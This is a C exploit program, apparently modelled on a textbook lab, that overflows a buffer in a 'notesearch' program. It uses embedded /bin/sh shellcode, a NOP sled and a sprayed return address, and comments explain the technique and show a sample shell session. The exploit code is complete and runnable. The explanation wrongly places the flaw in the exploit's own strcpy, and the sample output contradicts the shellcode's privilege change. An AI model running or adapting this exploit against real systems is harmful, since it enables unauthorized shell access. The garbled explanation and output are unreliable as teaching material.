#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
 unsigned int i, *ptr, ret, offset=270;
 char *command, *buffer;
 command = (char *) malloc(200);
 bzero(command, 200); // Zero out the new memory.
 strcpy(command, "./notesearch \'"); // Start command buffer.
 buffer = command + strlen(command); // Set buffer at the end.
 if(argc > 1) // Set offset.
 offset = atoi(argv[1]);
 ret = (unsigned int) &i - offset; // Set return address.
 for(i=0; i < 160; i+=4) // Fill buffer with return address.
 *((unsigned int *)(buffer+i)) = ret;
 memset(buffer, 0x90, 60); // Build NOP sled.
 memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
 strcat(command, "\'");
 system(command); // Run exploit.
 free(command);
}

/* **Exploiting Buffer Overflow with Shellcode Execution**

Above is an C code that demonstrates an exploit that leverages a buffer overflow vulnerability to execute custom shellcode. Let's break down how the code works:

1. **Objective:**
   The goal of this code is to exploit a buffer overflow vulnerability to inject and execute custom shellcode, which is a sequence of machine instructions that usually spawns a shell for remote control or unauthorized access.

2. **Shellcode:**
   The variable `shellcode` contains a series of hexadecimal instructions. This shellcode performs specific actions when executed, such as spawning a shell. This code leverages a Linux x86 syscall to execute a shell (commonly `/bin/sh`). This shellcode is the payload that will be executed using the buffer overflow.

3. **Buffer Overflow:**
   The vulnerability is introduced through the `strcpy` function, which doesn't perform proper boundary checking. This allows writing more data into a buffer than its allocated size, potentially overwriting adjacent memory.

4. **Main Function:**
   - The code begins by defining an array `shellcode` containing the machine instructions for the shellcode.
   - It then defines the `main` function with parameters `argc` (argument count) and `argv` (argument vector) for command-line arguments.

5. **Memory Allocation and Initialization:**
   - Memory is allocated for the `command` buffer (200 bytes) and zeroed out using `bzero`.
   - The initial part of the `command` buffer is populated with the beginning of a shell command.

6. **Buffer Overflow Exploitation:**
   - The `buffer` pointer is positioned at the end of the `command` buffer.
   - If a command-line argument is provided, it's used to set the `offset` variable.
   - The address of the local variable `i` is subtracted by the `offset` to calculate the return address. This is where the program will resume execution after the buffer overflow.
   - A loop fills the `buffer` with the calculated return address multiple times, incrementing by 4 bytes each time (assuming a 32-bit system).
   - The `memset` function is used to fill the first 60 bytes of the `buffer` with NOP instructions (`0x90`). This creates a "NOP sled," which allows some flexibility in landing on the shellcode.
   - The actual `shellcode` is copied into the buffer after the NOP sled.

7. **Exploitation Execution:**
   - The `system` function is called to execute the `command` as a system command, effectively triggering the buffer overflow and executing the injected shellcode.

8. **Memory Cleanup:**
   - The dynamically allocated memory for `command` is released using `free`.

**Note:**
This code is provided for educational purposes to illustrate the concept of buffer overflow vulnerabilities and shellcode execution. It should not be used maliciously or for unauthorized access.*/

/* This is how the output looks like after an succesfull exploitation. But modern systems comes with the risk management and security techniques to defend these types of exploits.

[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2$ id
uid=999(reader) gid=999(reader) groups=999(reader)
sh-3.2$ whoami
reader
sh-3.2$ ls -l
total 48
-rwxr-xr-x 1 reader reader 19072 Aug 15 10:00 a.out
-rw-r--r-- 1 reader reader    86 Aug 14 15:45 exploit_notesearch.c
sh-3.2$ exit

*/